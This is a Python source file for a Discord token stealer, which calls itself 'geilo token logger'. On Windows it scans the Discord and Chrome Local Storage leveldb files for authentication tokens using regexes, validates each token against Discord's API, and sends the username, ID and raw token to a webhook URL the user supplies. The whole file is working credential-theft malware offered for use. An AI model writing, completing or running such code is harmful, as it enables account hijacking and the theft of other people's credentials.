import os, re, json, requests

WEBHOOK_URL = "Your webhook url"

def retrieve_user(token):
    return json.loads(requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", "Content-Type": "application/json"}).text)

class Logger:

    def __init__(self):
        if os.name != 'nt':
            exit()

        self.tokens = []
        self.pc_user = os.getlogin()
        self.pc_roaming = os.getenv('APPDATA')
        self.pc_local = os.getenv('LOCALAPPDATA')

        self.get_tokens()

        for token in self.tokens:
            color = 000000
            raw_user_data = retrieve_user(token)
            user_json_str = json.dumps(raw_user_data)
            user = json.loads(user_json_str)
            if "username" in user:

                if WEBHOOK_URL:
                    webhook_data = {"username": "geilo token logger", "embeds": [
                        dict(title="result:",
                             color=f'{color}',
                             fields=[
                                 {
                                     "name": "**Account Info**",
                                     "value": f'User ID: {user["id"]}\nUsername: {user["username"] + "#" + user["discriminator"]}',
                                     "inline": True
                                 },
                                 {
                                     "name": "Token",
                                     "value": f"{token}",
                                     "inline": False
                                 },
                             ]),
                    ]}

                    requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))

            self.tokens.remove(token)

    def get_tokens(self):

        crawl = {
            'Discord': self.pc_roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Chrome': self.pc_local + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        }

        for source, path in crawl.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            self.tokens.append(token)


init = Logger()